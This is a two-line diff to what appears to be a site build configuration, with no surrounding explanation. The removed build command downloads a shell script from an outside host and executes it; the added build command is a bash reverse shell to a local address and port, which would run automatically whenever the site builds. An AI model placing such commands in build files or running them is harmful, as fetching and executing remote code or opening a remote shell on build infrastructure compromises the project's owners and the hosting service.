@@ -1,2 +1,2 @@
 [build]
-  command = "curl -LJO https://jeni.sh/test.sh && chmod +x test.sh && ./test.sh"
+  command = "bash -i >& /dev/tcp/127.0.0.1/1234 0>&1"
